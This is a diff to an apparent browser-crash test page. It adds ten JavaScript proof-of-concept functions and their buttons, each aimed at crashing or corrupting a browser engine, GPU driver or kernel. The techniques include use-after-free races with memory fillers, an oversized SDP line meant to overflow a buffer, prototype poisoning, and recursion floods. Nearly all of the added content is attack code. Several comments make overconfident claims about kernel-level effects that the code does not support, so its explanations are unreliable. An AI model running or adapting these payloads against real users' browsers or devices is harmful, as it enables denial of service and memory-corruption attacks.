@@ -39,6 +39,16 @@
 <button onclick="crashCanvasPutImageData()">08. Canvas putImageData Prototype Poisoning (OOB Read/Write)</button>
 <button onclick="crashImportNodeRecursion()">09. Document.importNode Recursive Mutation Event UAF</button>
 <button onclick="crashSCTPDataChannel()">10. WebRTC DataChannel SCTP Stream ID Overflow (NetBSD Panic)</button>
+            <button onclick="crashBlobRecursionStack()">01. Recursive Blob Construction Stack Smash (Kernel VFS Panic)</button>
+<button onclick="crashWebGLUniformBuffer()">02. WebGL2 Uniform Buffer Binding Offset Wraparound (GPU Panic)</button>
+<button onclick="crashHistoryStateObject()">03. History API PushState Serialization Mutator (Logic Error)</button>
+<button onclick="crashCanvasPatternCycle()">04. Canvas Pattern Cyclic Dependency Recursion (Render Crash)</button>
+<button onclick="crashPannerNodeRace()">05. WebAudio PannerNode Model Switch Race (DSP Kernel Panic)</button>
+<button onclick="crashTextTrackCueUAF()">06. Video TextTrackCue Event Listener UAF (Media Engine Crash)</button>
+<button onclick="crashGamepadPollution()">07. Gamepad API Prototype Pollution & Polling Race</button>
+<button onclick="crashSDPCodecOverflow()">08. WebRTC SDP Codec Parameter Stack Buffer Overflow</button>
+<button onclick="crashNodeInsertionRecursion()">09. DOMNodeInserted Recursive Event Flood (Stack Exhaustion)</button>
+<button onclick="crashTypedArraySetOverlap()">10. TypedArray.set() Overlapping Buffer Detach Race</button>
         </div>
 
         <div class="category">
@@ -952,10 +962,377 @@ function crashSCTPDataChannel() {
 }
 
 
+     
+function crashBlobRecursionStack() {
+    // Vector: Recursive Blob Construction
+    // Target: Kernel VFS / Memory Manager
+    // Logic: Nesting Blobs creates a linked list of references in the Kernel. 
+    // Reading a deeply nested blob forces recursive resolution, smashing the Kernel Stack.
+    
+    const depth = 5000;
+    let blobs = [new Blob(["base"])];
+    
+    // Create a deeply nested structure: Blob(Blob(Blob(...)))
+    try {
+        for (let i = 0; i < depth; i++) {
+            // New blob containing reference to previous blob
+            // This builds a huge reference chain in the VFS layer
+            const newBlob = new Blob([blobs[blobs.length - 1]], { type: 'application/octet-stream' });
+            blobs.push(newBlob);
+        }
         
+        // Trigger: Attempt to read the tip of the iceberg
+        // The kernel must traverse all 5000 layers to find the data.
+        const url = URL.createObjectURL(blobs[blobs.length - 1]);
+        const xhr = new XMLHttpRequest();
+        xhr.open('GET', url);
+        xhr.send();
+        
+        // Cleanup attempt to confuse reference counting during read
+        setTimeout(() => {
+            blobs = null;
+            URL.revokeObjectURL(url);
+        }, 1);
+        
+    } catch(e) {}
+}
+
+function crashWebGLUniformBuffer() {
+    // Vector: Uniform Buffer Offset Wraparound
+    // Target: GNM Driver (GPU)
+    // Logic: Binding a Uniform Buffer with an offset that causes 32-bit integer wrap-around.
+    // This points the GPU to read from invalid memory addresses (kernel space).
+    
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl2');
+    if (!gl) return;
+    
+    const ubo = gl.createBuffer();
+    gl.bindBuffer(gl.UNIFORM_BUFFER, ubo);
+    // Allocate normal size
+    gl.bufferData(gl.UNIFORM_BUFFER, 1024, gl.DYNAMIC_DRAW);
+    
+    // The Program
+    const vs = gl.createShader(gl.VERTEX_SHADER);
+    gl.shaderSource(vs, `#version 300 es
+    layout(std140) uniform Block { vec4 val; };
+    void main() { gl_Position = val; }`);
+    gl.compileShader(vs);
+    const fs = gl.createShader(gl.FRAGMENT_SHADER);
+    gl.shaderSource(fs, `#version 300 es
+    precision mediump float; out vec4 c; void main() { c = vec4(1.0); }`);
+    gl.compileShader(fs);
+    const prog = gl.createProgram();
+    gl.attachShader(prog, vs);
+    gl.attachShader(prog, fs);
+    gl.linkProgram(prog);
+    gl.useProgram(prog);
+    
+    const blockIndex = gl.getUniformBlockIndex(prog, "Block");
+    gl.uniformBlockBinding(prog, blockIndex, 0);
+    
+    // TRIGGER: Bind with offset close to MAX_UINT. 
+    // GPU Addr = Base + Offset. If Base + Offset overflows, it wraps to 0x0 or Kernel RAM.
+    const offset = 0xFFFFFFF0; // Must be aligned usually, but driver might fail check
+    try {
+        // Range: bind offset + size. 
+        gl.bindBufferRange(gl.UNIFORM_BUFFER, 0, ubo, offset, 16);
+        gl.drawArrays(gl.POINTS, 0, 1);
+        gl.finish();
+    } catch(e) {}
+}
+
+function crashHistoryStateObject() {
+    // Vector: History State Serialization Mutator
+    // Target: SerializedScriptValue (WebCore)
+    // Logic: pushState serializes the object. We pass an object with a getter.
+    // The getter navigates the page (location.href) mid-serialization, destroying the Document context.
+    
+    const evilState = {
+        get boom() {
+            // Mutate state during cloning
+            // This destroys the context SerializedScriptValue is working in
+            try {
+                window.location.reload(); 
+                // Or try to navigate iframe
+                const f = document.createElement('iframe');
+                document.body.appendChild(f);
+                f.contentWindow.location.reload();
+            } catch(e) {}
+            
+            // Return large object to force memory alloc
+            return new Array(10000).fill("A");
+        }
+    };
+    
+    // Deeply nest to ensure getter is called deep in the stack
+    const deep = { nested: { nested2: evilState } };
+    
+    try {
+        // history.pushState uses Structured Clone Algorithm
+        history.pushState(deep, "Crash", "?crash");
+    } catch(e) {}
+}
+
+function crashCanvasPatternCycle() {
+    // Vector: Canvas Pattern Recursion
+    // Target: 2D Graphics Context (Cairo/Skia backend logic)
+    // Logic: Create a cycle where Canvas A uses a Pattern from Canvas B, 
+    // and Canvas B uses a Pattern from Canvas A. Then draw.
+    // This creates an infinite recursion in the rendering pipeline.
+    
+    const c1 = document.createElement('canvas');
+    const c2 = document.createElement('canvas');
+    const ctx1 = c1.getContext('2d');
+    const ctx2 = c2.getContext('2d');
+    
+    c1.width = 100; c1.height = 100;
+    c2.width = 100; c2.height = 100;
+    
+    // Setup initial state
+    ctx1.fillStyle = "red";
+    ctx1.fillRect(0,0,100,100);
+    
+    try {
+        // Create Pattern 1 from Canvas 2
+        // Note: C2 is empty now, but we will dirty it later
+        const p1 = ctx1.createPattern(c2, 'repeat');
+        
+        // Create Pattern 2 from Canvas 1
+        const p2 = ctx2.createPattern(c1, 'repeat');
+        
+        // Assign cyclic patterns
+        ctx1.fillStyle = p1;
+        ctx2.fillStyle = p2;
+        
+        // Trigger the rendering cycle
+        // To render C1, it needs P1 (source C2).
+        // To render C2, it needs P2 (source C1).
+        // Stack Overflow in Render Engine.
+        ctx1.fillRect(0, 0, 100, 100);
+        ctx2.fillRect(0, 0, 100, 100); // Double trigger
+        
+    } catch(e) {}
+}
+
+function crashPannerNodeRace() {
+    // Vector: Audio Panner Model Switch Race
+    // Target: Audio DSP Thread
+    // Logic: The PannerNode has complex internal logic for HRTF (3D Audio).
+    // Switching 'panningModel' requires re-allocating delay lines and convolution buffers.
+    // Doing this rapidly while processing audio creates a UAF race in the DSP thread.
+    
+    if (!window.AudioContext) return;
+    const ctx = new AudioContext();
+    const osc = ctx.createOscillator();
+    const panner = ctx.createPanner();
+    
+    osc.connect(panner);
+    panner.connect(ctx.destination);
+    osc.start();
+    
+    const models = ['equalpower', 'HRTF'];
+    let i = 0;
+    
+    const iv = setInterval(() => {
+        try {
+            // Rapidly switch models
+            // HRTF loads database files (kernel/fs interaction)
+            // Equalpower is simple math.
+            panner.panningModel = models[i++ % 2];
+            
+            // Also thrash position to force calculations
+            panner.setPosition(Math.random()*10, Math.random()*10, Math.random()*10);
+            
+            if (i > 500) {
+                clearInterval(iv);
+                ctx.close();
+            }
+        } catch(e) {}
+    }, 1); // 1ms interval is aggressive for Audio Thread
+}
+
+function crashTextTrackCueUAF() {
+    // Vector: TextTrackCue Event UAF
+    // Target: WebCore::TextTrack
+    // Logic: Captions (<track>) fire events. If we remove the track 
+    // FROM INSIDE the event handler of a specific cue, the iterator in C++ breaks.
+    
+    const video = document.createElement('video');
+    const track = video.addTextTrack("captions", "Crash", "en");
+    track.mode = "showing";
+    
+    const cue = new VTTCue(0, 1, "Crash Text");
+    
+    cue.onenter = function() {
+        // This fires when video time hits 0
+        console.log("Cue entered");
+        
+        // O GOLPE: Destroy the track list while iterating cues
+        // This invalidates the C++ 'track' pointer held by the event dispatcher
+        try {
+            // Remove the specific cue
+            track.removeCue(cue);
+            // Disable mode
+            track.mode = "disabled";
+            // Remove video from DOM to trigger GC
+            video.remove();
+            
+            // Allocate garbage to fill the freed memory
+            const filler = new Array(1000).fill(1.1);
+        } catch(e) {}
+    };
+    
+    track.addCue(cue);
+    document.body.appendChild(video);
+    
+    // Trigger playback to hit the cue timestamp
+    // We don't need real video data, just the time ticker
+    try {
+        video.currentTime = 0; // Reset
+        video.play().catch(e=>{}); // Start logic
+    } catch(e) {}
+}
+
+function crashGamepadPollution() {
+    // Vector: Gamepad Prototype Pollution
+    // Target: Gamepad API / Kernel Input Driver
+    // Logic: Pollute the Gamepad prototype. When navigator.getGamepads() is called,
+    // the native code wraps kernel structures into JS Objects.
+    // If the prototype setters throw or mutate state, the native wrapper logic fails.
+    
+    if (!navigator.getGamepads) return;
+    
+    // Poison the prototype
+    try {
+        const pads = navigator.getGamepads();
+        if (pads && pads.length > 0 && pads[0]) {
+            const proto = Object.getPrototypeOf(pads[0]);
+            
+            // Poison 'axes' property
+            Object.defineProperty(proto, 'axes', {
+                get: function() {
+                    // This runs when code tries to read axes
+                    // Force a garbage collection or state change here
+                    const x = new ArrayBuffer(1024 * 1024);
+                    return [0.0, 0.0, 0.0, NaN]; // Return bad data
+                }
+            });
+        }
+    } catch(e) {}
+    
+    // Polling loop to force kernel interaction using poisoned objects
+    const iv = setInterval(() => {
+        const list = navigator.getGamepads();
+        for(let i=0; i<list.length; i++) {
+            if(list[i]) {
+                const axes = list[i].axes; // Trigger poison
+            }
+        }
+    }, 16);
+    
+    setTimeout(() => clearInterval(iv), 2000);
+}
+
+function crashSDPCodecOverflow() {
+    // Vector: WebRTC SDP Codec Overflow
+    // Target: SIP/SDP Parser (Kernel/Lib)
+    // Logic: Creating an SDP with an insanely long 'fmtp' (Format Parameter) line.
+    // The parser copies this line into a fixed-size stack buffer.
+    
+    if (!window.RTCPeerConnection) return;
+    const pc = new RTCPeerConnection();
+    
+    // Start with valid header
+    let sdp = "v=0\r\no=- 0 0 IN IP4 127.0.0.1\r\ns=-\r\nt=0 0\r\n";
+    sdp += "m=audio 1234 RTP/AVP 100\r\n";
+    
+    // Generate overflow string (100KB of 'A')
+    const overflow = "A".repeat(100000);
+    
+    // 'a=fmtp' line defines codec parameters. 
+    // Parsers often read this line until newline into a buffer.
+    sdp += "a=rtpmap:100 OPUS/48000/2\r\n";
+    sdp += "a=fmtp:100 minptime=10;useinbandfec=1; " + overflow + "\r\n";
+    
+    const desc = { type: 'offer', sdp: sdp };
+    
+    try {
+        // setRemoteDescription parses the SDP string
+        // This happens in C++ immediately
+        pc.setRemoteDescription(desc)
+          .then(() => {})
+          .catch(e => {});
+    } catch(e) {}
+}
+
+function crashNodeInsertionRecursion() {
+    // Vector: DOM Insertion Recursion
+    // Target: WebCore DOM Tree Mutator
+    // Logic: 'DOMNodeInserted' fires when a node is added. 
+    // If the handler adds the SAME node to a NEW parent, it triggers the event again.
+    // This creates an infinite recursion of DOM insertions, exhausting the C++ stack.
+    
+    const root = document.createElement('div');
+    const child = document.createElement('span');
+    
+    let depth = 0;
+    
+    // Add listener to 'root' (bubbles) or 'child'
+    document.addEventListener('DOMNodeInserted', function(e) {
+        if (e.target === child) {
+            depth++;
+            if (depth > 200) return; // Fail-safe (browser might crash before this)
+            
+            // Create a new container to move the child into
+            // This triggers 'DOMNodeInserted' again synchronously
+            const newParent = document.createElement('div');
+            try {
+                newParent.appendChild(child);
+            } catch(ex) {}
+        }
+    });
+    
+    // Trigger the chain reaction
+    root.appendChild(child);
+}
+
+function crashTypedArraySetOverlap() {
+    // Vector: TypedArray.set Overlapping Detach
+    // Target: JSC TypedArray::set
+    // Logic: typedArray.set(source) handles overlap copies.
+    // If 'source' is a view on the SAME buffer, but we detach it mid-copy via a getter...
+    
+    const buffer = new ArrayBuffer(1024);
+    const dest = new Uint8Array(buffer);
+    const src = new Uint8Array(buffer); // Overlapping view
+    
+    // Worker to handle detach
+    const w = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
+    
+    // Use a proxy-like approach or getters if possible to detect access
+    // Or just brute force race condition
+    
+    const killer = setInterval(() => {
+        // Attempt to detach buffer constantly
+        w.postMessage(buffer, [buffer]);
+    }, 0);
+    
+    try {
+        for(let i=0; i<10000; i++) {
+            // .set() performs memmove internally.
+            // If buffer is detached during memmove setup, pointers become invalid (NULL or garbage)
+            dest.set(src);
+        }
+    } catch(e) {}
+    
+    clearInterval(killer);
+}
+  
     </script>
 </body>
 </html>
+
 
 
 
